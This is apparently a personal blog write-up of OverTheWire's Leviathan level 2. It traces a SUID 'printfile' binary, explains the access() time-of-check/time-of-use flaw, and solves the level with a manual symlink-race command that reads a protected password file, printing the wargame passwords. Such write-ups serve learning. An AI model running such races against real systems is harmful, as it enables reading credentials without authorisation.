+++
date = 2020-05-04T14:00:00Z
lastmod = 2020-05-04T14:00:00Z
author ="l1ge"
title = "OverTheWire: Leviathan 2 Write-Up"
subtitle = "Write-up for Leviathan level 2 the FUN way"
feature = "image/leviathan_thumb.jpg"
width= "700"
height= "302"
caption = "Screenshot from Leviathan, 2014. Directed by Andrey Zvyagintsev"
tags = ["write-up", "overthewire", "reverse engineering"]
categories = ["write-ups"]

+++

There are plenty of write-ups out there for Leviathan's Level 2.  But none of them solved it the way I did: **the fun way!** - When you miss the very obvious solution but your qwerky way finally work

Let's first access the level

> ssh -p 2223 leviathan2@leviathan.labs.overthewire.org
>
> password: ougahZi8Ta

In the home folder there is an executable named `printfile`. Let's check its permissions

```bash
$ ls -l
total 8
-r-sr-x--- 1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
```

It has the SUID bit (s), which means we can run it with the permissions of its owner leviathan3
Great! so let's try to print leviathan3 password

```bash
$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

That would have been too easy. For some reason `printfile` doesn't allow us to access a file owned by leviathan3 despite the SUID bit. Let's investigate the binary with the command `ltrace`

```bash
$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                         = -1
puts("You cant have that file..."You cant have that file...
)                                  = 27
+++ exited (status 1) +++
```

I also tried `strace` to check the system calls

```bash
$ strace ./printfile /etc/leviathan_pass/leviathan3
execve("./printfile", ["./printfile", "/etc/leviathan_pass/leviathan3"], [/* 17 vars */]) = 0
strace: [ Process PID=32706 runs in 32 bit mode. ]
brk(NULL)                               = 0x804b000
fcntl64(0, F_GETFD)                     = 0
fcntl64(1, F_GETFD)                     = 0
fcntl64(2, F_GETFD)                     = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fd2000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=36357, ...}) = 0
mmap2(NULL, 36357, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fc9000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\204\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1787812, ...}) = 0
mmap2(NULL, 1796604, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7e12000
mmap2(0xf7fc3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0xf7fc3000
mmap2(0xf7fc6000, 10748, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7fc6000
close(3)                                = 0
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7e10000
set_thread_area({entry_number:-1, base_addr:0xf7e10700, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
mprotect(0xf7fc3000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xf7ffc000, 4096, PROT_READ)   = 0
munmap(0xf7fc9000, 36357)               = 0
access("/etc/leviathan_pass/leviathan3", R_OK) = -1 EACCES (Permission denied)
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 7), ...}) = 0
brk(NULL)                               = 0x804b000
brk(0x806c000)                          = 0x806c000
write(1, "You cant have that file...\n", 27You cant have that file...
) = 27
exit_group(1)                           = ?
+++ exited with 1 +++
```

To be honest, I don't understand what most of this means, but one line is pretty straightforward :

```bash
access("/etc/leviathan_pass/leviathan3", R_OK) = -1 EACCES (Permission denied)
```

There is an *access()* function that checks if I can access the file. Let's investigate how that function works.
From this [link](https://linux.die.net/man/2/access) I get a few interesting informations:

> The check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file. This allows set-user-ID programs to easily determine the invoking user's authority.

OK now I understand why, despite the SUID bit on the `printfile`, I can't access the password file.
I keep reading and stumble upon a serious lead :

> **Warning**: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.

I like that!
I decide to Google more and I discovered that this kind of vulnerabilities was called **TOCTOU** (Time-of-check to time-of-use) and was mostly abused using symlinks.

The idea is to modify the file between the moment it gets checked for permissions and the moment it gets opened. This is done by creating a symlink on the file, targeting the real file we wanna access. But this happens so fast, how can I do that ?

That's when it becomes fun. I could have made a script but in the intro of the Leviathan's series, its said you don't need to write scripts to solve any of the level.

Instead I did it... manually.

I used `tmux` to be able to launch two commands simultaneously. You can also use `screen`

```bash
$watch -n 0.1 "touch /tmp/l1ge/lev3; ln -sf /etc/leviathan_pass/leviathan3 /tmp/l1ge/lev3; rm /tmp/l1ge/lev3"
```

This command runs every 0.1 seconds with`watch -n 0.1`

-  `touch /tmp/l1ge/lev3` - creates a file *lev3*
- `ln -sf /etc/leviathan_pass/leviathan3 /tmp/l1ge/lev3`  - Creates a symlink on *lev3* targetting leviathan3's password file
-  `rm /tmp/l1ge/lev3` - Deletes *lev3*

To sum up, every 0.1 seconds it creates a file with permissions that can pass the *access()* function, symlinks it to the file we really wanna access, deletes it and start all over again.  

My plan is to run `./printfile` on my *lev3* file repeatedly until it magically sync up perfectly and the symlink happens right between *access()* reads the permissions and it gets passed to `cat` to print its content.

And to do that without a script, I'll use my fingers

I fire-up another `tmux` window and here I go, hitting UP ARROW and ENTER as fast I can to execute randomly the command on repeat.

```bash
$ ./printfile /tmp/l1ge/lev3
```

...until I hope the password magically appears. When you find yourself doing something so stupid on a CTF,  a strong inner voice tells you to give up and never touch a computer again.

BUT in less than 1mn the magic happened, that's fast enough to bypass my own pessimism.

![](/image/leviathan2.jpg)

Our password is  **Ahdiemoo1j**

There is of course a most reliable way to solve this level and you can check the other write-ups about it.

Hope you enjoyed!

Cheers,
l1ge.
